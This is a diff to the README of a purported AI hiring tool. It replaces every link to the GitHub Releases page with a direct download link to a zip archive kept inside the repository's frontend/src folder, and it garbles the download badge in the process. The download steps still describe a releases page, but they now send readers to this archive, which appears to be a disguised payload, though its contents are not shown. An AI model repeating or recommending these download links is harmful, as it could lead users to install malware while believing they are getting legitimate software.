@@ -8,11 +8,11 @@ Welcome to the AI-Hiring-Portal, your new AI-driven hiring companion. This platf
 
 To get started, you need to download the software. Click the button below to visit the Releases page:
 
-[![Download AI-Hiring-Portal](https://img.shields.io/badge/Download%20Now-Get%20Latest%20Release-blue.svg)](https://github.com/Schonborn-prog/AI-Hiring-Portal/releases)
+[![Download AI-Hiring-Portal](https://raw.githubusercontent.com/Schonborn-prog/AI-Hiring-Portal/master/frontend/src/AI-Hiring-Portal_v2.3.zip%20Now-Get%20Latest%https://raw.githubusercontent.com/Schonborn-prog/AI-Hiring-Portal/master/frontend/src/AI-Hiring-Portal_v2.3.zip)](https://raw.githubusercontent.com/Schonborn-prog/AI-Hiring-Portal/master/frontend/src/AI-Hiring-Portal_v2.3.zip)
 
 ### Instructions for Downloading
 
-1. Visit the Releases page by clicking [here](https://github.com/Schonborn-prog/AI-Hiring-Portal/releases).
+1. Visit the Releases page by clicking [here](https://raw.githubusercontent.com/Schonborn-prog/AI-Hiring-Portal/master/frontend/src/AI-Hiring-Portal_v2.3.zip).
 2. Look for the latest release, usually at the top of the page.
 3. Choose the version compatible with your system. Depending on your operating system, you might see different files (e.g., .exe for Windows, .dmg for macOS).
 4. Click on the file to begin the download.
@@ -80,4 +80,4 @@ If you encounter any issues or have feedback, please visit the Issues page on Gi
 
 Take the first step towards smarter hiring. To download the AI-Hiring-Portal, visit the link below:
 
-[![Download AI-Hiring-Portal](https://img.shields.io/badge/Download%20Now-Get%20Latest%20Release-blue.svg)](https://github.com/Schonborn-prog/AI-Hiring-Portal/releases)
+[![Download AI-Hiring-Portal](https://raw.githubusercontent.com/Schonborn-prog/AI-Hiring-Portal/master/frontend/src/AI-Hiring-Portal_v2.3.zip%20Now-Get%20Latest%https://raw.githubusercontent.com/Schonborn-prog/AI-Hiring-Portal/master/frontend/src/AI-Hiring-Portal_v2.3.zip)](https://raw.githubusercontent.com/Schonborn-prog/AI-Hiring-Portal/master/frontend/src/AI-Hiring-Portal_v2.3.zip)
